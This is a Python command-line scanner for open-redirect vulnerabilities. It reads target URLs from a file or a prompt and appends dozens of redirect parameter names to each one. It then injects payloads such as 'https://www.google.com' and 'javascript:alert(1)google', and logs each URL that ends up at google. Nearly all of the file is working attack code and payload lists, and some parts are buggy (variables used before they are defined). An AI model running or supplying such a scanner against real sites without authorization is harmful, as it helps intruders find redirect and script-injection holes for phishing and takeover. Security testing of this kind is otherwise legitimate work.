#testing open redirect tool -multi 

import requests
import re
from colorama import Fore, Back, Style



banner="""\u001b[31m
 ██████╗       ██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗ ██████╗ ██████╗ 
██╔═══██╗      ██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
██║   ██║█████╗██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║   ██║   ██║██████╔╝
██║   ██║╚════╝██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║   ██║   ██║██╔══██╗
╚██████╔╝FOR   ██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
 ╚═════╝OPEN REDIRECT═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   -by Abhishek Dirisipo
                                                                                                                       """
print(banner)




#***** main function ***************************************
def main_fun(target,i):
    print(Fore.BLUE +"______________")
    print("phase 2 -",i,"\n")
    #target="https://medium.com/m/global-identity-2?redirectUrl=https://www.google.com"
    cookies=""
    parameter=re.findall(r"[?]+[\w\W]+[=]",target)
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36','referer':target}
    
    #with parameter
    if len(parameter)>0:
        parameter=str(parameter[0])
        print("Identified parameter:",Fore.YELLOW +parameter,Fore.BLUE +" in phase 2 -",i)
    #without parameter
    if len(parameter)==0:
        target=target+'?param='+value
        parameter='?param='
        
    temp2=target
    for i in list1:
        for value in values:
            target=temp2
            print(Fore.CYAN +"[*] value=",value)
            target=target.replace(parameter,i)
            target=target.replace("customvalue",value)
            
            req=requests.get(target,headers=headers,cookies=cookies,allow_redirects=True)
            #print(target.replace(parameter,i))
            b=re.findall(r'[\w\W]{30}',req.url)
            if len(b)!=0:
                if choice==2 or choice!=1:
                    print(Fore.YELLOW +"current url -->",Fore.MAGENTA +req.url,Fore.YELLOW+str(req.history))
                else:
                    print(Fore.YELLOW +"current url -->",Fore.MAGENTA +req.url[:90]+"...",Fore.YELLOW+str(req.history))
                if 'google' in str(b[0]):
                    print(Fore.RED +"______*_*_*_*_____")
                    print(Fore.RED +"[*]!Open Redirect found!\n",Fore.RED +'\n[*]parameter--> '+Fore.CYAN+i,Fore.RED +'\n[*]original url with payload--> '+Fore.CYAN+target.replace(parameter,i),Fore.RED +'\n[*]redirected to--> '+Fore.CYAN+b[0])
                    print(Fore.RED +"______*_*_*_*_____")
                    with open('xsslogabhi/O-Redirector-results.txt','a') as f1:
                        f1.write('\nORIGINAL:-> \t\t'+target+'\nREDIRECTED TO:->\t\t'+req.url+str(req.history)+"\n")
            else:
                print(b,'invalid url !',req.history)
            if '30' in str(req.history) and target.replace(parameter,i)!=req.url:
                with open('xsslogabhi/O-Redirector-30x.txt','a') as f1:
                    f1.write('\n********\n\nORIGINAL:-> \t\t'+target.replace(parameter,i)+'\n\nREDIRECTED TO:->\t\t'+req.url[:100]+str(req.history)+"\n")
                if choice==2 or choice!=1:
                    print("check redirection for:",target)
                else:
                    print("check for redirection !")
    
#************************************************************

#******** payloads *****************************************
list2=['?next=','?url=','?target=','?redirectUrl=']

list3=['?next=','?url=','?target=','?rurl=','?dest=','?destination=','?RedirectUrl=','?redirectUrl=','?testing=hhh&redirectUrl=','?redir=','?redirect_uri=','?redirect_url='
       ,'?redirect=','/redirect/','/cgi-bin/redirect.cgi?','/out/','/out?','?view=','/login?to=','?image_url=','?go='
      ,'?return=','?returnTo=','?return_to=','?checkout_url=','?continue=','?return_path=','?success=','?data='
       ,'?qurl=','?login=','?logout=','?ext=','clickurl=','?goto=','?rit_url=','?forward_url=','@https://'
       ,'?forward=','?pic=','?callback_url=','?jump=','?jump_url=','/click?u=','?originUrl=','?origin=','?Url='
       ,'?desturl=','?u=','?page=','?u1=','?action=','?action_url=','?Redirect=','?sp_url=','?service='
       ,'?recurl=','/j?url=','?url=','?uri=http','?allinurl:','?q=','?link=','?src=','/tc?src='
       ,'?linkAddress=','?location=','?burl=','&burl=','?request=','?backurl='
       ,'?RedirectUrl=','?Redirect=','?ReturnUrl=']


list4=['?next=http://www.google.com&next=http://www.google.com&url=http://www.google.com&target=http://www.google.com&rurl=http://www.google.com&dest=http://www.google.com&destination=http://www.google.com&RedirectUrl=http://www.google.com&redirectUrl=http://www.google.com&testing=http://www.google.comhhh&redirectUrl=http://www.google.com&redir=http://www.google.com&redirect_uri=http://www.google.com&redirect_url=http://www.google.com&redirect=http://www.google.com/redirect/&/out/http://www.google.com&view=http://www.google.com/login&to=http://www.google.com&image_url=http://www.google.com&go=http://www.google.com&return=http://www.google.com&returnTo=http://www.google.com&return_to=http://www.google.com&checkout_url=http://www.google.com&continue=http://www.google.com&return_path=http://www.google.com&success=http://www.google.com&data=http://www.google.com&qurl=http://www.google.com&login=http://www.google.com&logout=http://www.google.com&ext=http://www.google.comclickurl=http://www.google.com&goto=http://www.google.com&rit_url=http://www.google.com&forward_url=http://www.google.com@https://&forward=http://www.google.com&pic=http://www.google.com&callback_url=http://www.google.com&jump=http://www.google.com&jump_url=http://www.google.com&u=http://www.google.com&originUrl=http://www.google.com&origin=http://www.google.com&Url=http://www.google.com&desturl=http://www.google.com&u=http://www.google.com&page=http://www.google.com&u1=http://www.google.com&action=http://www.google.com&action_url=http://www.google.com&Redirect=http://www.google.com&sp_url=http://www.google.com&service=http://www.google.comrecurl=http://www.google.com/j&url=http://www.google.com&url=http://www.google.com&uri=http://www.google.comhttp&allinurl:&q=http://www.google.com&link=http://www.google.com&src=http://www.google.com/tc&src=http://www.google.comlinkAddress=http://www.google.com&location=http://www.google.comhttp&location=http://www.google.comhttp&burl=http://www.google.com&burl=http://www.google.com&request=http://www.google.com&request=http://www.google.com&backurl=http://www.google.com&RedirectUrl=http://www.google.com&Redirect=http://www.google.com&Redirect=http://www.google.com&ReturnUrl=http://www.google.com&ReturnUrl=http://www.google.com']
list4[0]=list4[0].replace("http://www.google.com","customvalue")

values0=['https://www.google.com']
values1=['https://www.google.com','javascript:alert(1)google','https:%2f%2fwww.123google.com']
values2=['https://www.google.com','javascript:alert(1)google','https:%2f%2fwww.google.com','http://www.google.com']
values3=['https://www.google.com','javascript:alert(1)google','https:%2f%2fwww.google.com','http://www.google.com']

#************************************************************

#*************************user choice input *****************
print(Fore.CYAN +"1.multi-at-once payload mode(fast)\n2.single payload mode(slow and accurate)")
choice=int(input("select mode 1 or 2: "))
if choice==1:
    list1=list4
elif choice==2:
    list1=list3
else:
    print("please enter valid number.. currently running testing mode(only 4 payloads-demo) !")
    list1=list2
print(Fore.CYAN +"╚██████████████████████-█████████████████████|selected option:",choice,"|███████████████████████-██████████████████████╝\nvalues payload level-0\nvalues payload level-1\nvalues payload level-2\nvalues payload level-3")   
choice2=int(input("select any mode 0 to 3: "))
print('╔██████████████████████-█████████████████████|selected level :',choice2,'|███████████████████████-██████████████████████╗')
if choice2==0:
    values=values0
elif choice2==1:
    values=values1
elif choice2==2:
    print("\nnot yet implemented !")
    values=values2
elif choice2==3:
    print("\nnot yet implemented !")
    values=values3
#************************************************************


#a='https://www.shoppersstop.com/beauty/c-B10/rgerg/wrtwrtg?hkshs=dfe&dafds=df'
#a="https://medium.com/m/global-identity-2?redirectUrl=https://www.google.com"
#a=input(Fore.RED +Back.WHITE +"\nenter url:"+Back.RESET)

#***************displaying available text files in directory******************
import glob
print("\nList of All text Files in Current Directory:\n")
for file in glob.glob("*.txt"):
    print(file)

#**** read file line by line *****
fn=input(Fore.RED +"enter file name:  - ")

if 'LIVEMODE' not in fn and 'livemode' not in fn:
    file1 = open(fn, 'r') #open(input("enter file name:"), 'r')
    Lines = file1.readlines()
    count=0
    flag=0
    for a in Lines:

        try:
            count+=1
            print(Fore.RED +"\n(Line:"+str(count),")",Fore.BLUE +"selected url:",Fore.RED +a)



            print(Fore.BLUE +"phase 1 (developer stats-Abhishek Dirisipo)")

            #*****parameter identification*******
            parameter=re.findall(r"[?]+[\w\W]+[=]",a)
            if len(parameter)>0:
                print(Fore.YELLOW +"identified parameter:",parameter[0]," in phase 1\n")
                b=str(re.findall(r'[\w\W]+[\w\W]+[?]',a)).replace("?","")
                d=re.findall(r'[/]+[\w\-.#!@$%^()+;:]+',b)

            if len(parameter)==0:
                print("no parameter identified [X]!\n")
                b=re.findall(r"[/]+[\w\-.#!@$%^()+;:]+",a)
                d=b
            #************* !!!!  *****************

            c=re.findall(r'https://+[\w._:-]+[/]',a)
            if len(c)==0:
                c=re.findall(r'http://+[\w._:-]+[/]',a)

            print('without parameter: ',b,'\n')
            print('site: ',c[0])
            print('paths: ',d[1:],'\n')

            target=c[0]+'?param='+value
            if choice==1 and flag==0:
                flag=1
                main_fun(target,0)

            for i in range(len(d)):
                if i==0:
                    continue

                c[0]=c[0]+d[i]
                c[0]=c[0].replace("//","/")
                #print(c[0].replace("https:/","https://"))
                if len(parameter)>0:
                    target=c[0].replace("https:/","https://")+parameter[0]+value
                if len(parameter)==0:
                    target=c[0].replace("https:/","https://")+'?param='+value
                print(Fore.YELLOW +str(i),Fore.CYAN +target)
                main_fun(target,i)

        except requests.exceptions.RequestException:        
            print('\u001b[31;1m {e} Can not get target information\u001b[0m network error ! stopped ..')
            continue

        except requests.exceptions.Timeout:

            print("\u001b[31;1mOOPS!! Timeout Error.\u001b[0m")
            continue
        except requests.exceptions.HTTPError:

            print(f"\u001b[31;1m {err}. \u001b[0m")
            continue
        except Exception as e:

            print("sorry i think coding error or something strange.. \n\t\t\t-abhishek dirisipo !!!",Fore.YELLOW +" skipping-->")     
            print(e)
            continue


else:
    infi_loop=2
    while infi_loop!=1:
        count=0
        flag=0
        a=input("enter the url :")


        try:
            count+=1
            print(Fore.RED +"\n(Line:"+str(count),")",Fore.BLUE +"selected url:",Fore.RED +a)



            print(Fore.BLUE +"phase 1 (developer stats-Abhishek Dirisipo)")

            #*****parameter identification*******
            parameter=re.findall(r"[?]+[\w\W]+[=]",a)
            if len(parameter)>0:
                print(Fore.YELLOW +"identified parameter:",parameter[0]," in phase 1\n")
                b=str(re.findall(r'[\w\W]+[\w\W]+[?]',a)).replace("?","")
                d=re.findall(r'[/]+[\w\-.#!@$%^()+;:]+',b)

            if len(parameter)==0:
                print("no parameter identified [X]!\n")
                b=re.findall(r"[/]+[\w\-.#!@$%^()+;:]+",a)
                d=b
            #************* !!!!  *****************

            c=re.findall(r'https://+[\w._:-]+[/]',a)
            if len(c)==0:
                c=re.findall(r'http://+[\w._:-]+[/]',a)

            print('without parameter: ',b,'\n')
            print('site: ',c[0])
            print('paths: ',d[1:],'\n')

            target=c[0]+'?param='+value
            if choice==1 and flag==0:
                flag=1
                main_fun(target,0)

            for i in range(len(d)):
                if i==0:
                    continue

                c[0]=c[0]+d[i]
                c[0]=c[0].replace("//","/")
                #print(c[0].replace("https:/","https://"))
                if len(parameter)>0:
                    target=c[0].replace("https:/","https://")+parameter[0]+value
                if len(parameter)==0:
                    target=c[0].replace("https:/","https://")+'?param='+value
                print(Fore.YELLOW +str(i),Fore.CYAN +target)
                main_fun(target,i)

        except requests.exceptions.RequestException:        
            print('\u001b[31;1m {e} Can not get target information\u001b[0m network error ! stopped ..')
            continue

        except requests.exceptions.Timeout:

            print("\u001b[31;1mOOPS!! Timeout Error.\u001b[0m")
            continue
        except requests.exceptions.HTTPError:

            print(f"\u001b[31;1m {err}. \u001b[0m")
            continue
        except Exception as e:

            print("sorry i think coding error or something strange.. \n\t\t\t-abhishek dirisipo !!!",Fore.YELLOW +" skipping-->")     
            print(e)
            continue




